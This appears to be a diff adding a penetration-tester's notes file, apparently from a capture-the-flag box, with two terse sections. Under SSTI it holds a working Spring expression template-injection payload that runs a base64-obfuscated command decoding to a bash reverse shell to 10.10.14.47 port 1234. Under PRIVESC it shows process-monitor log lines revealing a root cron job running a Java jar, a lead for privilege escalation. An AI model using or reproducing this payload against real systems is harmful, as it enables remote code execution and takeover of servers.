@@ -1,0 +1,10 @@
+SSTI
+=================================
+https://gist.github.com/kavishkagihan/259ff65726ec8cb86867e8ecb79f5341
+*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny8xMjM0IDA+JjEK}|{base64,-d}|{bash,-i}").getInputStream()).next()}
+
+PRIVESC
+===============
+/bin/sh -c /root/run_credits.sh 
+2022/09/13 11:34:01 CMD: UID=0    PID=2635   | /bin/sh /root/run_credits.sh 
+2022/09/13 11:34:01 CMD: UID=0    PID=2636   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
